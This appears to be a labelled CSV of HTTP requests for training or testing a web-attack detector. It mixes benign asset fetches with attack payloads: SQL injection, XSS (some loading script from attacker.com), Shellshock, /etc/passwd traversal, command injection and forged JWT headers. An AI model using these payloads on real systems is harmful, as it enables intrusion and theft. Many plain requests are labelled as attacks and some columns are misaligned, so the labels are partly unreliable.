method,path,query,headers,body,ua,label
GET,/assets/where.svg,,,HTTP/1.1,,0
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/assets/script.min.js,,,HTTP/1.1,,0
GET,/static/css/button-cat-1WoIsfsg.css,,,HTTP/1.1,,0
GET,"data:text/html,<form action=https://127.0.0.1/xss-cp.php method=post ><input type=hidden name=a value=""<img/src=//127.0.0.1/yt.jpg onpoin terenter=alert`1`>""><input type=submit></form>",,,,,1
GET,/static/css/cat.png,,,HTTP/1.1,,0
GET,/build/update-handler-0Zt4geXV.png,,,HTTP/1.1,,0
GET,/,?34ea04b04c=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/insert.css,,,HTTP/1.1,,0
GET,/build/date-update-e8j5Sl8o.png,,,HTTP/1.1,,0
GET,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,,,1
GET,/,call=getRawDataFromDatabase&query=file:///etc/passwd,,,,1
GET,../../../../etc/passwd,,,,,1
GET,/,<svg/onload=alert(1)>,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/js/script.svg,,,HTTP/1.1,,0
GET,"-1945+/*!%55NiOn*/%20/*!%53eLEct*/+1,2,3,%27soy%20vulnerable%27,5,6, 7,8,9,10,11,12,13,14,15,16,17,18,19+--+",,,,,1
GET,/,,,HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,1
GET,/static/css/drop-icon-BxrYGcX9.svg,,,HTTP/1.1,,0
GET,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,,,1
GET,/assets/eval.png,,,HTTP/1.1,,0
GET,id=1' OR '1'='1,,,,,1
GET,|| ls -la,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/assets/button-alert-JstuDKWs.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/media/script-clause-Zo0Gb69t.jpg,,,HTTP/1.1,,0
GET,/build/onerror-image-KYbxRBsq.woff2,,,HTTP/1.1,,0
GET,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,../../../../etc/passwd%00,,,,,1
GET,/media/delete.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
POST,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*","{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,,,1
GET,/assets/select.woff2,,,HTTP/1.1,,0
GET,/static/js/insert.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
POST,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*","{""alg"":""none""}",,1
GET,/static/css/delete-row-U4RyVXEf.css,,,HTTP/1.1,,0
GET,db.injection.insert%28%7Bsuccess:1%7D%29%3B,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/media/update.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,%253cscript%253ealert(1)%253c/script%253e,,,,,1
GET,/build/drop.min.css,,,HTTP/1.1,,0
GET,/build/insert.svg,,,HTTP/1.1,,0
GET,/media/function-where-e4vlzb7b.svg,,,HTTP/1.1,,0
GET,/build/select.svg,,,HTTP/1.1,,0
GET,/assets/alert.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/alert.woff2,,,HTTP/1.1,,0
GET,/assets/insert.woff2,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/build/select.jpg,,,HTTP/1.1,,0
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/static/css/dialog-eval-NyflUVhr.png,,,HTTP/1.1,,0
GET,/static/css/icon-eval-emA8j7gU.js,,,HTTP/1.1,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,/,?a8aafb9364=%3Cimg%20src%20onerror=confirm%281%29%3E,,,,1
GET,/build/alert.svg,,,HTTP/1.1,,0
GET,gzip compressed content with chosen prefix,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/cat.woff2,,,HTTP/1.1,,0
GET,|| ls -la,,,,,1
GET,/media/whoami-button-OaHQj6rb.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/css/onerror.min.css,,,HTTP/1.1,,0
GET,"""><video><source onerror=eval(atob(http://some_host)) id=dmFyIGE9ZG9 jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5 ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#6 1;>",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/where.svg,,,HTTP/1.1,,0
GET,/assets/zone-alert-utwptPEU.js,,,HTTP/1.1,,0
GET,/,onerror=alert(1),,,,1
GET,union select,,,,,1
GET,/assets/onerror.css,,,HTTP/1.1,,0
GET,/build/onerror.min.js,,,HTTP/1.1,,0
GET,/static/img/../../etc/passwd,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/media/select.js,,,HTTP/1.1,,0
POST,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*","{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
GET,${os.system('id')},,,,,1
GET,`uname -a`,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,;var date = new Date(); do{curDate = new Date();}while(curDate-date,,,,,1
GET,"<!--#exec cmd=""ls"" -->",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
POST,/,,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
POST,/,,,"{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,1
GET,/,,,,,0
GET,/media/alert.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/build/icon-alert-FoCpXEC6.svg,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/static/css/function-cat-Yw90p7Z7.js,,,HTTP/1.1,,0
GET,/media/insert-menu-FiUWPfHR.js,,,HTTP/1.1,,0
GET,/static/css/alert.png,,,HTTP/1.1,,0
